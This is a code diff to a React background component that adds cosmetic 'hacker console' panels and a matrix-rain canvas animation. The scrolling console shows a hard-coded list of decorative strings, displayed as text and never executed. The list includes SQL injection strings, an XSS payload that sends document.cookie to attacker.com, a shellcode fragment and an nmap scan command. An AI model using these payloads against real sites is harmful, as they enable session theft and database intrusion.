@@ -2,7 +2,118 @@ import { useState, useEffect, useRef } from 'react'
 import { C, FONT, MATRIX_CHARS, HEX_CHARS, BINARY_CHARS } from '../constants'
 import type { Screen } from '../types'
 
+const EXPLOIT_PAYLOADS = [
+  "SELECT * FROM users WHERE id='1' OR '1'='1'",
+  "UNION SELECT null, username, password FROM admin--",
+  "<script>document.location='http://attacker.com/cookie?='+document.cookie</script>",
+  "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50",
+  "GET /cgi-bin/test.cgi?%20HTTP/1.1\\r\\nHost: target",
+  "WAF_BYPASS: X-Originating-IP: 127.0.0.1",
+  "curl -d 'password=admin' -X POST http://localhost:8000/auth",
+  "nmap -sV -p 80,443,8080,8443 -T4 target.domain",
+  "PAYLOAD: <iframe src='javascript:alert(1)'></iframe>",
+  "CRACKING HASH: $2a$12$R9h/cIPz0gi.UR3t3...",
+  "STATUS: EXPLOIT COMPLETED [SESSION: 0x9F82]",
+  "OVERFLOW SLED: \\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90",
+  "INJECTING SHELLCODE... DONE",
+  "RECON: CRAWLING INTERNAL ENDPOINTS...",
+  "FOUND: /admin/config.php (403 Forbidden)",
+  "BYPASSING AUTH WITH SQLi... SUCCESS",
+  "EXTRACTING DATABASE TABLES... 14 TABLES FOUND",
+  "CRITICAL: CVE-2024-XXXX EXPLOITED SUCCESSFULLY",
+]
 
+function ExploitConsole() {
+  const doubleList = [...EXPLOIT_PAYLOADS, ...EXPLOIT_PAYLOADS, ...EXPLOIT_PAYLOADS]
+  return (
+    <div style={{
+      width: '100%', height: '100%', overflow: 'hidden', position: 'relative',
+      padding: '8px 12px',
+    }}>
+      <div style={{
+        display: 'flex', flexDirection: 'column', gap: 12,
+        animation: 'cyber-scroll-up 24s linear infinite',
+      }}>
+        {doubleList.map((payload, i) => (
+          <div key={i} style={{
+            fontFamily: FONT.mono, fontSize: 8,
+            color: 'rgba(0, 255, 136, 0.75)',
+            whiteSpace: 'pre-wrap',
+            wordBreak: 'break-all',
+            lineHeight: 1.3,
+            textShadow: '0 0 2px rgba(0,255,136,0.3)',
+          }}>
+            <span style={{ color: C.green, marginRight: 4 }}>$</span>
+            {payload}
+          </div>
+        ))}
+      </div>
+    </div>
+  )
+}
+
+function MatrixRainCanvas() {
+  const canvasRef = useRef<HTMLCanvasElement>(null)
+
+  useEffect(() => {
+    const canvas = canvasRef.current
+    if (!canvas) return
+    
+    const resizeCanvas = () => {
+      canvas.width = canvas.clientWidth
+      canvas.height = canvas.clientHeight
+    }
+    resizeCanvas()
+
+    const ctx = canvas.getContext('2d')
+    if (!ctx) return
+
+    const columns = Math.floor(canvas.width / 10)
+    const yPositions = Array(columns).fill(0)
+
+    let animationId: number
+    const chars = '01010101010101HEX0XVERDICTSQLiXSS<>[]{}/\\'
+
+    const draw = () => {
+      ctx.fillStyle = 'rgba(5, 7, 10, 0.08)'
+      ctx.fillRect(0, 0, canvas.width, canvas.height)
+
+      ctx.fillStyle = '#00d4ff'
+      ctx.font = '9px monospace'
+
+      for (let i = 0; i < yPositions.length; i++) {
+        const char = chars[Math.floor(Math.random() * chars.length)]
+        const x = i * 10
+        const y = yPositions[i]
+
+        if (Math.random() > 0.98) {
+          ctx.fillStyle = '#ffffff'
+        } else {
+          ctx.fillStyle = 'rgba(0, 212, 255, 0.8)'
+        }
+
+        ctx.fillText(char, x, y)
+
+        if (y > canvas.height && Math.random() > 0.975) {
+          yPositions[i] = 0
+        } else {
+          yPositions[i] += 10
+        }
+      }
+      animationId = requestAnimationFrame(draw)
+    }
+
+    animationId = requestAnimationFrame(draw)
+    
+    window.addEventListener('resize', resizeCanvas)
+    return () => {
+      cancelAnimationFrame(animationId)
+      window.removeEventListener('resize', resizeCanvas)
+    }
+  }, [])
+
+  return <canvas ref={canvasRef} style={{ display: 'block', width: '100%', height: '100%' }} />
+}
 
 function CyberRadar({ isDashboard, reveal }: { isDashboard?: boolean; reveal?: number }) {
   const ro = reveal ?? 1
@@ -202,71 +313,77 @@ export default function Background({ isDashboard, screen }: { isDashboard: boole
         </div>
       ))}
 
-      {/* Left HUD Panel */}
+      {/* Left Hacker Console */}
       <div className="hud-left" style={{
-        position: 'fixed', left: 40, top: 140, bottom: 140, width: 140,
-        flexDirection: 'column', justifyContent: 'space-between',
-        pointerEvents: 'none', zIndex: 1, opacity: 0.5 * reveal,
+        position: 'fixed', left: 32, top: 120, bottom: 120, width: 190,
+        flexDirection: 'column',
+        pointerEvents: 'none', zIndex: 1, opacity: 0.65 * reveal,
         transition: 'opacity 1000ms ease-out',
-        borderRight: `1px dashed rgba(0, 255, 136, 0.12)`,
-        paddingRight: 16,
+        background: 'rgba(5, 7, 10, 0.85)',
+        border: `1px solid rgba(0, 255, 136, 0.25)`,
+        borderRadius: 6,
+        boxShadow: '0 0 15px rgba(0, 255, 136, 0.05), inset 0 0 10px rgba(0, 255, 136, 0.05)',
+        overflow: 'hidden',
       }}>
-        <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
-          <span style={{ fontFamily: FONT.mono, fontSize: 8, color: C.green, letterSpacing: '0.08em' }}>//_GRID_STATUS</span>
-          <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
-            <div className="pulse-dot" style={{ width: 6, height: 6, borderRadius: '50%', background: C.green }} />
-            <span style={{ fontFamily: FONT.mono, fontSize: 9, color: C.textPrimary, fontWeight: 700 }}>SEC_ACTIVE</span>
+        <div style={{
+          height: 24, background: 'rgba(0, 255, 136, 0.1)',
+          borderBottom: `1px solid rgba(0, 255, 136, 0.2)`,
+          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
+          padding: '0 10px',
+        }}>
+          <span style={{ fontFamily: FONT.mono, fontSize: 8, color: C.green, fontWeight: 700, letterSpacing: '0.06em' }}>
+            [EXPLOIT_STREAM]
+          </span>
+          <div style={{ display: 'flex', gap: 3 }}>
+            <div style={{ width: 4, height: 4, borderRadius: '50%', background: C.green }} />
+            <div style={{ width: 4, height: 4, borderRadius: '50%', background: C.green, opacity: 0.5 }} />
           </div>
         </div>
-
-        <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
-          <span style={{ fontFamily: FONT.mono, fontSize: 8, color: C.muted, letterSpacing: '0.08em' }}>//_RECON_STATE</span>
-          <span style={{ fontFamily: FONT.mono, fontSize: 9, color: C.textPrimary }}>PORT_OK : 8443</span>
-          <span style={{ fontFamily: FONT.mono, fontSize: 8, color: C.muted }}>SYS_ONLINE</span>
-        </div>
-
-        <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
-          <span style={{ fontFamily: FONT.mono, fontSize: 8, color: C.muted, letterSpacing: '0.08em' }}>//_ORCHESTRATOR</span>
-          <span style={{ fontFamily: FONT.mono, fontSize: 9, color: C.cyan }}>AI_READY</span>
+        <div style={{ flex: 1, position: 'relative', overflow: 'hidden' }}>
+          <ExploitConsole />
+          <div style={{
+            position: 'absolute', left: 0, right: 0, height: 20, top: 0,
+            background: 'linear-gradient(to bottom, transparent, rgba(0, 255, 136, 0.08) 50%, transparent)',
+            animation: 'scan-line 4s linear infinite',
+            pointerEvents: 'none',
+          }} />
         </div>
       </div>
 
-      {/* Right HUD Panel */}
+      {/* Right Hacker Console */}
       <div className="hud-right" style={{
-        position: 'fixed', right: 40, top: 140, bottom: 140, width: 140,
-        flexDirection: 'column', justifyContent: 'space-between',
-        pointerEvents: 'none', zIndex: 1, opacity: 0.5 * reveal,
+        position: 'fixed', right: 32, top: 120, bottom: 120, width: 190,
+        flexDirection: 'column',
+        pointerEvents: 'none', zIndex: 1, opacity: 0.65 * reveal,
         transition: 'opacity 1000ms ease-out',
-        borderLeft: `1px dashed rgba(0, 212, 255, 0.12)`,
-        paddingLeft: 16,
+        background: 'rgba(5, 7, 10, 0.85)',
+        border: `1px solid rgba(0, 212, 255, 0.25)`,
+        borderRadius: 6,
+        boxShadow: '0 0 15px rgba(0, 212, 255, 0.05), inset 0 0 10px rgba(0, 212, 255, 0.05)',
+        overflow: 'hidden',
       }}>
-        <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
-          <span style={{ fontFamily: FONT.mono, fontSize: 8, color: C.cyan, letterSpacing: '0.08em' }}>//_INTEGRITY</span>
-          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 8px)', gap: 4, marginTop: 4 }}>
-            {Array.from({ length: 16 }).map((_, i) => (
-              <div
-                key={i}
-                style={{
-                  width: 8, height: 8, borderRadius: '1px',
-                  background: i % 5 === 0 ? C.red : i % 3 === 0 ? C.cyan : C.green,
-                  opacity: i % 2 === 0 ? 0.35 : 0.85,
-                  animation: i % 3 === 0 ? 'pulse-dot 1.5s infinite alternate' : 'none',
-                }}
-              />
-            ))}
+        <div style={{
+          height: 24, background: 'rgba(0, 212, 255, 0.1)',
+          borderBottom: `1px solid rgba(0, 212, 255, 0.2)`,
+          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
+          padding: '0 10px',
+        }}>
+          <span style={{ fontFamily: FONT.mono, fontSize: 8, color: C.cyan, fontWeight: 700, letterSpacing: '0.06em' }}>
+            [MATRIX_RAIN]
+          </span>
+          <div style={{ display: 'flex', gap: 3 }}>
+            <div style={{ width: 4, height: 4, borderRadius: '50%', background: C.cyan }} />
+            <div style={{ width: 4, height: 4, borderRadius: '50%', background: C.cyan, opacity: 0.5 }} />
           </div>
         </div>
-
-        <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
-          <span style={{ fontFamily: FONT.mono, fontSize: 8, color: C.muted, letterSpacing: '0.08em' }}>//_TELEMETRY</span>
-          <span style={{ fontFamily: FONT.mono, fontSize: 9, color: C.textPrimary }}>LAT_0.02ms</span>
-          <span style={{ fontFamily: FONT.mono, fontSize: 8, color: C.muted }}>SYS_60FPS</span>
-        </div>
-
-        <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
-          <span style={{ fontFamily: FONT.mono, fontSize: 8, color: C.muted, letterSpacing: '0.08em' }}>//_SYS_REGION</span>
-          <span style={{ fontFamily: FONT.mono, fontSize: 8, color: C.muted }}>HUD: LOCAL_POOL</span>
-          <span style={{ fontFamily: FONT.mono, fontSize: 8, color: C.muted }}>LOC: 0X_SEC</span>
+        <div style={{ flex: 1, position: 'relative', overflow: 'hidden', background: '#05070a' }}>
+          <MatrixRainCanvas />
+          <div style={{
+            position: 'absolute', left: 0, right: 0, height: 20, top: 0,
+            background: 'linear-gradient(to bottom, transparent, rgba(0, 212, 255, 0.08) 50%, transparent)',
+            animation: 'scan-line 5s linear infinite',
+            pointerEvents: 'none',
+          }} />
         </div>
       </div>
     </div>
